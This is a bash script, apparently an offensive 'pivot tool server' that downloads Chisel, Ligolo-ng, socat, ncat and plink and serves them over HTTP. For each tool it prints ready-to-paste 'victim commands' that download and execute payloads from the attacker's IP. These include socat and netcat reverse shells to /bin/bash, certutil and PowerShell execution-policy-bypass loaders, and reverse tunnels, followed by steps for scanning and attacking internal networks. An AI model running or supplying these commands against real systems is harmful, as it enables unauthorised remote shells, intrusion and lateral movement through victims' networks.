#!/bin/bash

# Pivot Tool Server
# Usage: curl -sL https://raw.githubusercontent.com/xl337x/pivoting/main/pivot.sh | bash

clear
echo "========================================"
echo "       PIVOT TOOL SERVER"
echo "========================================"
echo ""

read -p "[?] Your IP: " IP < /dev/tty
if [ -z "$IP" ]; then
    echo "[-] IP required!"
    exit 1
fi

PORT=$(shuf -i 8000-65000 -n 1)
rm -rf /tmp/pivot_serve 2>/dev/null
mkdir -p /tmp/pivot_serve
cd /tmp/pivot_serve

echo ""
echo "========================================"
echo " SELECT TOOL"
echo "========================================"
echo " 1) Chisel"
echo " 2) Ligolo-ng"
echo " 3) Socat"
echo " 4) Netcat"
echo " 5) Plink"
echo " 6) All tools"
echo "========================================"
echo ""
read -p "[?] Choice [1-6]: " TOOL < /dev/tty

case $TOOL in
    1)
        echo ""
        echo "[*] Downloading Chisel..."
        
        # Server for attacker
        if ! command -v chisel &>/dev/null; then
            echo "[*] Installing Chisel server on your box..."
            curl -sL https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz | gunzip > /tmp/chisel_srv 2>/dev/null
            chmod +x /tmp/chisel_srv
            sudo mv /tmp/chisel_srv /usr/local/bin/chisel 2>/dev/null || { mkdir -p ~/bin; mv /tmp/chisel_srv ~/bin/chisel; export PATH=$PATH:~/bin; }
            echo "[+] Chisel server installed!"
        else
            echo "[+] Chisel server already installed"
        fi
        
        # Agent for victim
        curl -sL https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz | gunzip > chisel_linux 2>/dev/null
        chmod +x chisel_linux
        curl -sL https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz | gunzip > chisel.exe 2>/dev/null
        echo "[+] Chisel agents ready!"
        echo ""
        echo "========================================"
        echo " VICTIM COMMANDS"
        echo "========================================"
        echo ""
        echo "--- LINUX ---"
        echo "curl http://$IP:$PORT/chisel_linux -o /tmp/c&&chmod +x /tmp/c&&/tmp/c client $IP:9001 R:socks"
        echo ""
        echo "wget http://$IP:$PORT/chisel_linux -O /tmp/c&&chmod +x /tmp/c&&/tmp/c client $IP:9001 R:socks"
        echo ""
        echo "--- WINDOWS ---"
        echo "certutil -urlcache -f http://$IP:$PORT/chisel.exe %TEMP%\\c.exe&&%TEMP%\\c.exe client $IP:9001 R:socks"
        echo ""
        echo "powershell -ep bypass -c \"iwr http://$IP:$PORT/chisel.exe -O \$env:TEMP\\c.exe;\$env:TEMP\\c.exe client $IP:9001 R:socks\""
        echo ""
        echo "========================================"
        echo " ATTACKER (run in another terminal)"
        echo "========================================"
        echo "chisel server -p 9001 --reverse"
        echo ""
        echo "# Use with proxychains (edit /etc/proxychains.conf -> socks5 127.0.0.1 1080)"
        echo "proxychains nmap -sT -Pn TARGET"
        echo ""
        ;;
    2)
        echo ""
        echo "[*] Downloading Ligolo-ng..."
        
        # Proxy for attacker
        if ! command -v ligolo-ng &>/dev/null; then
            echo "[*] Installing Ligolo-ng proxy on your box..."
            curl -sL https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz -o /tmp/ligolo_proxy.tar.gz
            tar xzf /tmp/ligolo_proxy.tar.gz -C /tmp 2>/dev/null
            chmod +x /tmp/proxy
            sudo mv /tmp/proxy /usr/local/bin/ligolo-ng 2>/dev/null || { mkdir -p ~/bin; mv /tmp/proxy ~/bin/ligolo-ng; export PATH=$PATH:~/bin; }
            rm -f /tmp/ligolo_proxy.tar.gz
            echo "[+] Ligolo-ng proxy installed!"
        else
            echo "[+] Ligolo-ng proxy already installed"
        fi
        
        # Agent for victim
        curl -sL https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_linux_amd64.tar.gz | tar xz 2>/dev/null
        mv agent ligolo_linux 2>/dev/null
        chmod +x ligolo_linux
        curl -sL https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_windows_amd64.zip -o ligolo.zip 2>/dev/null
        unzip -qo ligolo.zip 2>/dev/null
        mv agent.exe ligolo.exe 2>/dev/null
        rm -f ligolo.zip LICENSE README.md 2>/dev/null
        echo "[+] Ligolo agents ready!"
        echo ""
        echo "========================================"
        echo " VICTIM COMMANDS"
        echo "========================================"
        echo ""
        echo "--- LINUX ---"
        echo "curl http://$IP:$PORT/ligolo_linux -o /tmp/a&&chmod +x /tmp/a&&/tmp/a -connect $IP:11601 -ignore-cert"
        echo ""
        echo "wget http://$IP:$PORT/ligolo_linux -O /tmp/a&&chmod +x /tmp/a&&/tmp/a -connect $IP:11601 -ignore-cert"
        echo ""
        echo "--- WINDOWS ---"
        echo "certutil -urlcache -f http://$IP:$PORT/ligolo.exe %TEMP%\\a.exe&&%TEMP%\\a.exe -connect $IP:11601 -ignore-cert"
        echo ""
        echo "powershell -ep bypass -c \"iwr http://$IP:$PORT/ligolo.exe -O \$env:TEMP\\a.exe;\$env:TEMP\\a.exe -connect $IP:11601 -ignore-cert\""
        echo ""
        echo "========================================"
        echo " ATTACKER (run in another terminal)"
        echo "========================================"
        echo "sudo ip tuntap add user \$(whoami) mode tun ligolo"
        echo "sudo ip link set ligolo up"
        echo "ligolo-ng -selfcert -laddr 0.0.0.0:11601"
        echo ""
        echo "========================================"
        echo " LIGOLO-NG FULL GUIDE"
        echo "========================================"
        echo ""
        echo "# STEP 1: Setup interface (one time)"
        echo "sudo ip tuntap add user \$(whoami) mode tun ligolo"
        echo "sudo ip link set ligolo up"
        echo ""
        echo "# STEP 2: Start proxy"
        echo "ligolo-ng -selfcert -laddr 0.0.0.0:11601"
        echo ""
        echo "# STEP 3: After agent connects, in ligolo console:"
        echo "session                              # List sessions"
        echo "                                     # Press ENTER to select"
        echo "ifconfig                             # Show victim networks"
        echo ""
        echo "# STEP 4: Add route (in NEW terminal)"
        echo "sudo ip route add 172.16.X.0/24 dev ligolo"
        echo ""
        echo "# STEP 5: Start tunnel (back in ligolo console)"
        echo "start"
        echo ""
        echo "# NOW YOU CAN ACCESS INTERNAL NETWORK DIRECTLY:"
        echo "nmap -sT -Pn 172.16.X.X"
        echo "ssh user@172.16.X.X"
        echo "curl http://172.16.X.X"
        echo "crackmapexec smb 172.16.X.0/24"
        echo ""
        echo "# USEFUL LIGOLO COMMANDS:"
        echo "session                    # Switch session"
        echo "ifconfig                   # Show interfaces"
        echo "start                      # Start tunnel"
        echo "stop                       # Stop tunnel"
        echo "listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444   # Reverse port forward"
        echo "listener_list              # List listeners"
        echo ""
        echo "# DOUBLE PIVOT (pivot through pivot):"
        echo "# On 2nd pivot host, run agent connecting to 1st pivot"
        echo "# Add route: sudo ip route add 10.10.X.0/24 dev ligolo"
        echo ""
        ;;
    3)
        echo ""
        echo "[*] Downloading Socat..."
        curl -sL https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -o socat_linux
        chmod +x socat_linux
        echo "[+] Socat ready!"
        echo ""
        echo "========================================"
        echo " VICTIM COMMANDS (Linux only)"
        echo "========================================"
        echo ""
        echo "# Reverse Shell"
        echo "curl http://$IP:$PORT/socat_linux -o /tmp/s&&chmod +x /tmp/s&&/tmp/s TCP:$IP:4444 EXEC:/bin/bash"
        echo ""
        echo "# Port Forward"
        echo "curl http://$IP:$PORT/socat_linux -o /tmp/s&&chmod +x /tmp/s&&/tmp/s TCP-LISTEN:8080,fork TCP:TARGET:80"
        echo ""
        echo "========================================"
        echo " ATTACKER"
        echo "========================================"
        echo "nc -lvnp 4444"
        echo ""
        ;;
    4)
        echo ""
        echo "[*] Downloading Netcat..."
        curl -sL https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat -o nc_linux
        chmod +x nc_linux
        echo "[+] Netcat ready!"
        echo ""
        echo "========================================"
        echo " VICTIM COMMANDS (Linux only)"
        echo "========================================"
        echo ""
        echo "curl http://$IP:$PORT/nc_linux -o /tmp/n&&chmod +x /tmp/n&&/tmp/n $IP 4444 -e /bin/bash"
        echo ""
        echo "========================================"
        echo " ATTACKER"
        echo "========================================"
        echo "nc -lvnp 4444"
        echo ""
        ;;
    5)
        echo ""
        echo "[*] Downloading Plink..."
        curl -sL https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe -o plink.exe
        echo "[+] Plink ready!"
        echo ""
        echo "========================================"
        echo " VICTIM COMMANDS (Windows only)"
        echo "========================================"
        echo ""
        echo "certutil -urlcache -f http://$IP:$PORT/plink.exe %TEMP%\\p.exe&&%TEMP%\\p.exe -ssh $IP -l user -pw pass -R 9050:127.0.0.1:9050 -N"
        echo ""
        echo "========================================"
        echo " ATTACKER"
        echo "========================================"
        echo "sudo systemctl start ssh"
        echo ""
        ;;
    6)
        echo ""
        echo "[*] Downloading ALL tools..."
        
        # Install servers on attacker
        if ! command -v chisel &>/dev/null; then
            echo "[*] Installing Chisel server..."
            curl -sL https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz | gunzip > /tmp/chisel_srv 2>/dev/null
            chmod +x /tmp/chisel_srv
            sudo mv /tmp/chisel_srv /usr/local/bin/chisel 2>/dev/null || { mkdir -p ~/bin; mv /tmp/chisel_srv ~/bin/chisel; export PATH=$PATH:~/bin; }
        fi
        
        if ! command -v ligolo-ng &>/dev/null; then
            echo "[*] Installing Ligolo-ng proxy..."
            curl -sL https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz -o /tmp/lp.tar.gz
            tar xzf /tmp/lp.tar.gz -C /tmp 2>/dev/null
            chmod +x /tmp/proxy
            sudo mv /tmp/proxy /usr/local/bin/ligolo-ng 2>/dev/null || { mkdir -p ~/bin; mv /tmp/proxy ~/bin/ligolo-ng; export PATH=$PATH:~/bin; }
            rm -f /tmp/lp.tar.gz
        fi
        echo "[+] Servers installed!"
        
        # Agents for victims
        echo "[*] Downloading agents..."
        curl -sL https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz | gunzip > chisel_linux 2>/dev/null
        chmod +x chisel_linux
        curl -sL https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz | gunzip > chisel.exe 2>/dev/null
        curl -sL https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_linux_amd64.tar.gz | tar xz 2>/dev/null
        mv agent ligolo_linux 2>/dev/null; chmod +x ligolo_linux
        curl -sL https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_windows_amd64.zip -o l.zip 2>/dev/null
        unzip -qo l.zip 2>/dev/null; mv agent.exe ligolo.exe 2>/dev/null; rm -f l.zip LICENSE README.md 2>/dev/null
        curl -sL https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -o socat_linux; chmod +x socat_linux
        curl -sL https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat -o nc_linux; chmod +x nc_linux
        curl -sL https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe -o plink.exe
        echo "[+] All agents ready!"
        echo ""
        echo "========================================"
        echo " LINUX VICTIM COMMANDS"
        echo "========================================"
        echo ""
        echo "# Chisel"
        echo "curl http://$IP:$PORT/chisel_linux -o /tmp/c&&chmod +x /tmp/c&&/tmp/c client $IP:9001 R:socks"
        echo ""
        echo "# Ligolo"
        echo "curl http://$IP:$PORT/ligolo_linux -o /tmp/a&&chmod +x /tmp/a&&/tmp/a -connect $IP:11601 -ignore-cert"
        echo ""
        echo "# Socat Shell"
        echo "curl http://$IP:$PORT/socat_linux -o /tmp/s&&chmod +x /tmp/s&&/tmp/s TCP:$IP:4444 EXEC:/bin/bash"
        echo ""
        echo "# Netcat Shell"
        echo "curl http://$IP:$PORT/nc_linux -o /tmp/n&&chmod +x /tmp/n&&/tmp/n $IP 4444 -e /bin/bash"
        echo ""
        echo "========================================"
        echo " WINDOWS VICTIM COMMANDS"
        echo "========================================"
        echo ""
        echo "# Chisel"
        echo "certutil -urlcache -f http://$IP:$PORT/chisel.exe %TEMP%\\c.exe&&%TEMP%\\c.exe client $IP:9001 R:socks"
        echo ""
        echo "# Ligolo"
        echo "certutil -urlcache -f http://$IP:$PORT/ligolo.exe %TEMP%\\a.exe&&%TEMP%\\a.exe -connect $IP:11601 -ignore-cert"
        echo ""
        echo "# Plink"
        echo "certutil -urlcache -f http://$IP:$PORT/plink.exe %TEMP%\\p.exe&&%TEMP%\\p.exe -ssh $IP -l user -pw pass -R 9050:127.0.0.1:9050 -N"
        echo ""
        echo "========================================"
        echo " ATTACKER COMMANDS"
        echo "========================================"
        echo ""
        echo "# Chisel server:"
        echo "chisel server -p 9001 --reverse"
        echo ""
        echo "# Ligolo proxy:"
        echo "sudo ip tuntap add user \$(whoami) mode tun ligolo"
        echo "sudo ip link set ligolo up"
        echo "ligolo-ng -selfcert -laddr 0.0.0.0:11601"
        echo ""
        echo "# Listener:"
        echo "nc -lvnp 4444"
        echo ""
        ;;
    *)
        echo "[-] Invalid choice!"
        exit 1
        ;;
esac

echo "========================================"
echo " FILES READY"
echo "========================================"
ls -lh /tmp/pivot_serve/ 2>/dev/null | grep -vE "^total|^d"
echo ""
echo "========================================"
echo " SERVING: http://$IP:$PORT/"
echo " Ctrl+C to stop"
echo "========================================"
echo ""

python3 -m http.server $PORT
